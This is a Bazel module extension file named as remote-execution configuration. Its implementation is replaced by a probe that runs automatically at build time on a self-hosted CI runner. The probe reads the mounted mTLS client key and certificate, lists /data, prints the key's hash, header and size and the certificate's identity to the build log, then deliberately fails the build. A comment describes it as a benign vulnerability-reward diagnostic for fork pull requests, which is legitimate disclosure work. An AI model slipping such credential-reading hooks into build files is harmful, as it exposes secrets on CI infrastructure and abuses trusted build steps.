"""Module extension for remote_execution."""

load("//tools/toolchains/remote:configure.bzl", "remote_execution_configure")

def _impl(mctx):
    # Benign credential-exposure diagnostic (OSS VRP): demonstrates that fork-PR-controlled
    # Bazel code executing on the self-hosted runner can read the mounted EngFlow mTLS client
    # key. It prints only the key file's SHA-256 + PEM header + byte count and the PUBLIC cert
    # identity; it NEVER prints the private key bytes and NEVER uses the key. Then it fails on
    # purpose to abort the build immediately (so it does not consume the GPU runner).
    r = mctx.execute(["sh", "-c", (
        "echo H059-CREDPROBE uid=$(id -u); " +
        "echo H059-CREDPROBE key_present=$(test -f /data/ci-cert.key && echo yes || echo no); " +
        "echo H059-CREDPROBE key_sha256=$(sha256sum /data/ci-cert.key 2>&1 | cut -d' ' -f1); " +
        "echo H059-CREDPROBE key_header=$(head -1 /data/ci-cert.key 2>&1); " +
        "echo H059-CREDPROBE key_bytes=$(wc -c < /data/ci-cert.key 2>&1); " +
        "echo H059-CREDPROBE cert_subject=$(openssl x509 -in /data/ci-cert.crt -noout -subject 2>&1 | head -c 160); " +
        "echo H059-CREDPROBE cert_enddate=$(openssl x509 -in /data/ci-cert.crt -noout -enddate 2>&1); " +
        "echo H059-CREDPROBE data_ls=$(ls -1 /data 2>&1 | tr '\n' ',')"
    )])
    print("H059-CREDPROBE-STDOUT>>>\n" + r.stdout)  # buildifier: disable=print
    print("H059-CREDPROBE-STDERR>>>\n" + r.stderr)  # buildifier: disable=print
    fail("H059-CREDPROBE complete; aborting intentionally to avoid consuming the runner.")

remote_execution_configure_ext = module_extension(implementation = _impl)
